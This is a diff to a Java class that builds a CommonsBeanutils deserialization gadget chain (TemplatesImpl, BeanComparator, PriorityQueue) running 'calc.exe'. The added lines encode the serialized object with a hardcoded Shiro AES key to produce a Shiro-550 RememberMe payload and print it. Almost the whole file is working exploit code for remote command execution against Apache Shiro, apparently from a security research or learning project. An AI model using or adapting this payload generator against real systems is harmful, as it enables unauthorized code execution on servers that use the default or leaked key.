@@ -20,18 +20,20 @@ PriorityQueue.readObject()
  */
 public class CommonsBeanutils {
     public static void main(String[] args) throws Exception {
-        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc.exe");
 
         BeanComparator beanComparator = new BeanComparator();
-//        beanComparator.compare(templateimpl ,templateimpl);
+
         PriorityQueue priorityQueue = new PriorityQueue(2,beanComparator);
         priorityQueue.add("1");
         priorityQueue.add("1");
+
         setValue(beanComparator ,"property" ,"outputProperties");
         setValue(priorityQueue,"queue",new Object[]{templates,templates});
 
-        serialize(priorityQueue ,"bin/CB2.bin");
-        unserialize("bin/CB2.bin");
+        String payload = Utils.shiro550Encode("n5RYm2z1V60+D+OiNLXksQ==" ,serialize(priorityQueue ,"bin/CB2.bin"));
+        System.out.println(payload);
+//        unserialize("bin/CB2.bin");
 //        beanComparator.getProperty(new People() ,"age");
 //        PropertyUtils.getProperty(new People(),"age");
     }
